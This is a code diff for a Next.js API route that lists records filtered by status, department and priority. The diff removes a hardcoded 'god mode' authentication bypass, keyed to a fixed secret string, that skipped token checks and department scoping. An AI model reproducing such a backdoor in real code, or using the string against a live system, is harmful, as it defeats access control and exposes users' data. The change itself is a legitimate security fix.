@@ -18,25 +18,24 @@ export async function GET(request) {
         let query = {};
         const authHeader = request.headers.get('authorization');
         const token = extractToken(authHeader);
-        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';
-        if (!isGodMode) {
-            if (!token) {
-                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
-            }
-            const decoded = verifyToken(token);
-            if (!decoded) {
-                return NextResponse.json({ error: 'Invalid token' }, { status: 401 });
-            }
-            if (decoded.role === 'admin' || decoded.role === 'staff') {
-                const user = await User.findById(decoded.id);
-                if (user && user.departmentId) {
-                    const dept = await Department.findById(user.departmentId);
-                    if (dept) {
-                        query.department = dept.name;
-                    }
+
+        if (!token) {
+            return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
+        }
+        const decoded = verifyToken(token);
+        if (!decoded) {
+            return NextResponse.json({ error: 'Invalid token' }, { status: 401 });
+        }
+        if (decoded.role === 'admin' || decoded.role === 'staff') {
+            const user = await User.findById(decoded.id);
+            if (user && user.departmentId) {
+                const dept = await Department.findById(user.departmentId);
+                if (dept) {
+                    query.department = dept.name;
                 }
             }
         }
+
         if (status) query.status = status;
         if (department && !query.department) query.department = department; 
         if (priority) query.priority = priority;
